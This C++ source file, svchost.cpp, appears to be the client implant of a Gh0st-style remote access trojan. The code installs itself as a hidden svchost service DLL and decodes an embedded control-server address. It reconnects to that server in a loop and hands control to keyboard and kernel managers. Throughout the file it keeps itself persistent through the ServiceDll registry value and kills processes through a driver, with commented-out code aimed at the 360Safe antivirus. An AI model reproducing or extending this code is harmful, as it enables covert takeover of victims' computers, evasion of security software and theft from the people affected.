// svchost.cpp : Defines the entry point for the console application.
//
#pragma optimize("gsy",on)
/*#pragma comment(linker,"/RELEASE")*/
//#pragma comment(lib,"msvcrt.lib")
/*#pragma comment(linker,"/IGNORE:4078")
#pragma comment(linker,"/OPT:NOWIN98")*/
//#pragma comment(linker,"/merge:.rdata=.data")
//#pragma comment(linker,"/merge:.text=.data")

//#pragma comment(linker, "/OPT:NOWIN98")
#include "ClientSocket.h"
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/install.h"
#include "common/until.h"
#include "../Public.h"

//#include "MD5.h"

enum
{
    NOT_CONNECT, //  ��û������
    GETLOGINFO_ERROR,
    CONNECT_ERROR,
    HEARTBEATTIMEOUT_ERROR
};

//#define		HEART_BEAT_TIME		1000 * 30;//60 * 3 // ����ʱ��

extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);
extern "C" __declspec(dllexport) void servicemain(int argc, wchar_t* argv[])
{

}
extern "C" __declspec(dllexport) void AerviceMaio(int argc, wchar_t* argv[])
{

}

int TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress);
void __stdcall ServiceHandler(DWORD dwControl);

#ifdef _CONSOLE
int main(int argc, char **argv);
#else
DWORD WINAPI main(char *lpServiceName);
#endif
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
TCHAR	svcname[MAX_PATH];

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
    // �����쳣�����´�������
    HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}

DWORD WINAPI KillPro(TCHAR *lpProName)
{
    HANDLE hDriver;
    MYDATA data;
    DWORD pid;
    data.ModuleAddress = (ULONG)GetModuleHandle(TEXT("ntdll.dll"));
    while (1)
    {
        Sleep(3000);
        hDriver = CreateFile(TEXT("\\\\.\\MYDRIVERDOS"), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hDriver == INVALID_HANDLE_VALUE)
            break;
        data.Pid = GetProcessID(lpProName);
        if (data.Pid == 0)
            continue;
        data.Pid ^= XorValue;
        DeviceIoControl(hDriver, IOCTL_KILL, &data, sizeof(MYDATA), NULL, 0, NULL, NULL);
        CloseHandle(hDriver);
    }
    return 0;
}
// һ��Ҫ�㹻��
#ifdef _CONSOLE
#include <stdio.h>
int main(int argc, char **argv)
#else
DWORD WINAPI main(char *lpServiceName)
#endif
{
#ifdef _CONSOLE
    //if (argc < 3)
    //{
    //	printf("Usage:\n %s <Host> <Port>\n", argv[0]);
    //	return -1;
    //}
#endif
    // lpServiceName,��ServiceMain���غ��û����
    TCHAR	strServiceName[200];
    lstrcpy(strServiceName, TEXT("clientService"));
    TCHAR	strKillEvent[60];
    HANDLE	hInstallMutex = NULL;
    if (!CKeyboardManager::MyFuncInitialization())
        return -1;
#ifdef _DLL
    TCHAR	strFileName[MAX_PATH];
    CKeyboardManager::MyGetModuleFileName( CKeyboardManager::g_hInstance, strFileName, sizeof(strFileName));
    CKeyboardManager::hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    TCHAR	*lpURL = (TCHAR *)FindConfigString(CKeyboardManager::hFile, TEXT("WCCCRX"));
    if (lpURL == NULL)
    {
        return -1;
    }
    CloseHandle(CKeyboardManager::hFile);
    //////////////////////////////////////////////////////////////////////////
    // Set Window Station
    //	HWINSTA hOldStation = GetProcessWindowStation();
    TCHAR str1[50] = TEXT("gQlkjY.");
    EncryptData((TCHAR *)&str1, lstrlen(str1), 12);
    HWINSTA hWinSta = OpenWindowStation( str1, FALSE, MAXIMUM_ALLOWED);
    if (hWinSta != NULL) 
        SetProcessWindowStation(hWinSta);
    //////////////////////////////////////////////////////////////////////////

    if (CKeyboardManager::g_hInstance != NULL)
    {
        SetUnhandledExceptionFilter(bad_exception);
        //FIXME: ǿת�����⣬by zhangyl
        //lstrcpy(strServiceName, (TCHAR*)lpServiceName);
        lstrcpy(strServiceName, TEXT("clientService"));
        TCHAR str2[50] = TEXT("7RoXYRB43");
        EncryptData((TCHAR *)&str2, lstrlen(str2), 12);
        wsprintf( strKillEvent, TEXT("%s%03dJP"), str2, GetTickCount() + 5 ); // ����¼���

        hInstallMutex = CreateMutex(NULL, true, lpURL);
        ReConfigService(strServiceName);
        // ɾ����װ�ļ�
        //		Sleep(1000);
        //		DeleteInstallFile(lpServiceName);
        /*
                char *KILLNAME = "DSMain.exe";
                MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillPro, (LPVOID)KILLNAME, 0, NULL);
                char *KILLNAMEE  = "360Safe.exe";
                MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillPro, (LPVOID)KILLNAMEE, 0, NULL);
                */
    }
    // http://hi.baidu.com/zxhouse/blog/item/dc651c90fc7a398fa977a484.html
#endif
    // ���߲���ϵͳ:���û���ҵ�CD/floppy disc,��Ҫ����������
	//ϵͳ����ʾcritical-error-handler��Ϣ�� �෴��ϵͳ�������͵����ý��̡�
    SetErrorMode(SEM_FAILCRITICALERRORS);
    TCHAR	*lpszHost = TEXT("127.0.0.1");
    //TCHAR	*lpszHost = TEXT("10.32.26.125");
    DWORD	dwPort = 8080;
    TCHAR	*lpszProxyHost = NULL;//����͵���������������
    //	DWORD	dwProxyPort = 0;
    //	char	*lpszProxyUser = NULL;
    //	char	*lpszProxyPass = NULL;

    HANDLE	hEvent = NULL;

    CClientSocket socketClient;
    socketClient.bSendLogin = true;
    BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
    while (1)
    {
        // �������������ʱ��������sleep������
        if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
        {
            // 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
            for (int i = 0; i < 2000; i++)
            {
                hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, strKillEvent);
                if (hEvent != NULL)
                {
                    socketClient.Disconnect();
                    CloseHandle(hEvent);
                    break;
                }
                // ÿ��˯��60���룬һ��˯��2000�Σ�����������
                Sleep(60);
            }
        }// end if
#ifdef _DLL
        // ���߼��Ϊ2��, ǰ6��'A'�Ǳ�־
        //FIXME: TCHARǿת��char�����⣬by zhangyl
        if (!getLoginInfo(MyDecode((char*)(lpURL + 6)), (char**)&lpszHost, &dwPort, (char**)&lpszProxyHost))//, 
            //				&dwProxyPort, &lpszProxyUser, &lpszProxyPass))
        {
            bBreakError = GETLOGINFO_ERROR;
            continue;
        }
        lstrcpy( CKeyboardManager::ConnPass, lpszProxyHost );//���뱣����CKeyboardManager::ConnPass��
#else
        //����ע�͵��� by zhangyl
        //lpszHost = argv[1];
        //dwPort = atoi(argv[2]);
#endif

        //		if (lpszProxyHost != NULL)
        //			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
        //		else
        //			socketClient.setGlobalProxyOption();

        /*
                char msg[200] = {0};
                wsprintf( msg, "%s\n%d\n%s", lpszHost, dwPort, CKeyboardManager::ConnPass );
                MessageBox(NULL,msg,"",NULL);
                */
        if (!socketClient.Connect(lpszHost, dwPort))
        {
            bBreakError = CONNECT_ERROR;
            continue;
        }
        CKeyboardManager::dwTickCount = GetTickCount();
        // ��¼
        DWORD dwExitCode = SOCKET_ERROR;
        sendLoginInfo_false(&socketClient);
        CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
        socketClient.setManagerCallBack(&manager);

        //////////////////////////////////////////////////////////////////////////
        // �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
        for (int i = 0; (i < 10 && !manager.IsActived()); i++)
        {
            Sleep(1000);
        }
        // 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
        if (!manager.IsActived())
            continue;

        //////////////////////////////////////////////////////////////////////////

        DWORD	dwIOCPEvent;
        CKeyboardManager::dwTickCount = GetTickCount();
        do
        {
            hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
            dwIOCPEvent = WaitForSingleObject(socketClient.m_hExitEvent, 100);
            Sleep(500);
        } while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

        if (hEvent != NULL)
        {
            socketClient.Disconnect();
            CloseHandle(hEvent);
            break;
        }
    }// end while-loop
#ifdef _DLL
    //////////////////////////////////////////////////////////////////////////
    // Restor WindowStation and Desktop	
    // ����Ҫ�ָ�׿�棬��Ϊ����Ǹ��·���˵Ļ����·���������У��˽��ָ̻�����׿�棬���������
    // 	SetProcessWindowStation(hOldStation);
    // 	CloseWindowStation(hWinSta);
    //
    //////////////////////////////////////////////////////////////////////////
#endif

    SetErrorMode(0);
    ReleaseMutex(hInstallMutex);
    CloseHandle(hInstallMutex);

    return 0;
}

BOOL APIENTRY DllMain(HANDLE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (!CKeyboardManager::MyFuncInitialization()) return FALSE;
        CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
        CKeyboardManager::m_dwLastMsgTime = GetTickCount();
        CKeyboardManager::Initialization();
        break;
    case DLL_THREAD_ATTACH:
        CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
        CKeyboardManager::m_dwLastMsgTime = GetTickCount();
        CKeyboardManager::Initialization();
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

DWORD WINAPI Protect_Self(LPVOID lparam)
{
    TCHAR *ServiceName = (TCHAR*)lparam;//��������
    TCHAR Self_Path[MAX_PATH] = { 0 };//����·��
    CKeyboardManager::MyGetModuleFileName(CKeyboardManager::g_hInstance, Self_Path, sizeof(Self_Path));
    TCHAR bin[MAX_PATH] = { 0 };
    wsprintf(bin, TEXT("SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters"), ServiceName);
    SleepEx(15000, 0);
    CKeyboardManager::MyMoveFile(Self_Path, TEXT("12333.cmd"));
    WriteRegEx(HKEY_LOCAL_MACHINE, bin, TEXT("ServiceDll"), REG_EXPAND_SZ, Self_Path, lstrlen(Self_Path) + 1, 0);
    CKeyboardManager::MyMoveFile(TEXT("12333.cmd"), Self_Path);
    return 0;
}

void ServiceMain(int argc, wchar_t* argv[])
{
    lstrcpyn(svcname, (TCHAR*)argv[0], ARRAYSIZE(svcname)); //it's should be unicode, but if it's ansi we do it well
    //ע�͵���by zhangyl
    //wcstombs(svcname, argv[0], sizeof svcname);

    /*RegisterServiceCtrlHandler������SCM����һ������Ŀ��ƴ�����
    ��������
    Handler����ָ�롣
    */
    hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
    //	if( hServiceStatus == NULL )
    //		return;
    //	else
    FreeConsole();//��������ý���������Ŀ���̨

    TellSCM(SERVICE_START_PENDING, 0, 1);
    TellSCM(SERVICE_RUNNING, 0, 0);
    // call Real Service function noew

    g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
    HANDLE hThread = NULL;
    hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
    MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Protect_Self, (LPVOID)svcname, 0, NULL);
    do
    {
        Sleep(100);//not quit until receive stop command, otherwise the service will stop
    } while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    if (g_dwServiceType == 0x120)
    {
        //Shared�ķ��� ServiceMain ���˳�����ȻһЩϵͳ��svchost����Ҳ���˳�
        while (1) 
            Sleep(10000);
    }
    return;
}

int TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus(hServiceStatus, &srvStatus);
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    // not really necessary because the service stops quickly
    switch (dwControl)
    {
    case SERVICE_CONTROL_STOP:
        TellSCM(SERVICE_STOP_PENDING, 0, 1);
        Sleep(100);
        TellSCM(SERVICE_STOPPED, 0, 0);
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
        TellSCM(SERVICE_PAUSED, 0, 0);
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
        TellSCM(SERVICE_RUNNING, 0, 0);
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM(g_dwCurrState, 0, 0);
        break;
    }
}